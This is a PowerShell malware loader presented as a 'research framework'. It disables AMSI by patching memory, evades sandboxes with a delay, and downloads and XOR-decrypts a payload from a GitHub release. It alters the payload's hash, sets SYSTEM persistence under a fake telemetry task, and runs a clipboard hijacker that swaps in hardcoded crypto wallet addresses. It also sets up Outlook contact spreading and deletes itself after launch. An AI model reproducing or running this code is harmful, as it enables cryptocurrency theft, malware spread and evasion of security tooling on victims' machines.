# --- [FINAL POLYMORPHIC RESEARCH FRAMEWORK v5.0] ---

function Patch-Mem {
    # Blinds AMSI via memory patching to prevent real-time script scanning
    try {
        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $w::GetModuleHandle("am" + "si.dll")
        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
        $old = 0
        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
    } catch { }
}

function Set-Persistence {
    param($exePath)
    # Generates a randomized name for the Task to prevent name-based detection
    $tName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $action = New-ScheduledTaskAction -Execute $exePath
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $tName -Description "Windows System Telemetry" -User "SYSTEM" -Force
}

function Invoke-Clipper {
    # Background thread monitoring clipboard for crypto address swaps
    $wallets = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
    $regex = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        while($true) {
            $clip = [Windows.Forms.Clipboard]::GetText()
            foreach($coin in $using:regex.Keys) {
                if($clip -match $using:regex[$coin] -and $clip -ne $using:wallets[$coin]) { [Windows.Forms.Clipboard]::SetText($using:wallets[$coin]) }
            }
            Start-Sleep -Seconds 2
        }
    }
}

function Invoke-OutlookSpread {
    # MAPI Harvesting: Spreads through trusted internal contacts
    try {
        $ol = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue
        if ($ol) {
            $ns = $ol.GetNameSpace("MAPI")
            $contacts = $ns.GetDefaultFolder(6).Items
            for($i=1; $i -le 10; $i++) {
                $contact = $contacts.Item($i)
                if ($contact.Email1Address) {
                    $m = $ol.CreateItem(0); $m.To = $contact.Email1Address
                    $m.Subject = "Required: Project Update Documents"
                    $m.Body = "Please check the attached documents for the quarterly update.`n`nRegards,`n$($ns.CurrentUser.Name)"
                    # $m.Attachments.Add("Path_to_your_exe")
                    # $m.Send() 
                }
            }
        }
    } catch { }
}

# --- MAIN EXECUTION ENGINE ---
Patch-Mem

# [FORCING] VM Sandbox Evasion (120s delay if low hardware resources detected)
if (((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory) -lt 4GB) { Start-Sleep -s 120 }

# Paths and Config
$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
$key = 0xAB
$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Templates"
$randomName = -join ((97..122) | Get-Random -Count 8 | % {[char]$_}) + ".exe"
$finalPath = Join-Path $workDir $randomName

if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }

try {
    # 1. Download XOR data via BITS
    $tmp = "$env:TEMP\$(Get-Random).tmp"
    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
    
    # 2. XOR Decrypt in Memory
    $raw = Get-Content $tmp -Raw
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }

    # 3. POLYMORPHIC HASH CHANGE
    # Appending random junk data to the end of the file to change the SHA-256 signature
    $junk = New-Object Byte[] (Get-Random -Min 100 -Max 2000)
    (New-Object Random).NextBytes($junk)
    $polymorphicData = $data + $junk
    
    [IO.File]::WriteAllBytes($finalPath, $polymorphicData)
    Remove-Item $tmp -Force

    # 4. Persistence & Spreading
    Set-Persistence -exePath $finalPath
    Invoke-Clipper
    Invoke-OutlookSpread
    
    # 5. Detached Launch (Explorer as Parent)
    (New-Object -ComObject "Shell.Application").ShellExecute($finalPath, "", "", "open", 0)

    # 6. Melt (Self-Delete Script)
    Remove-Item $MyInvocation.MyCommand.Path -Force
} catch { }
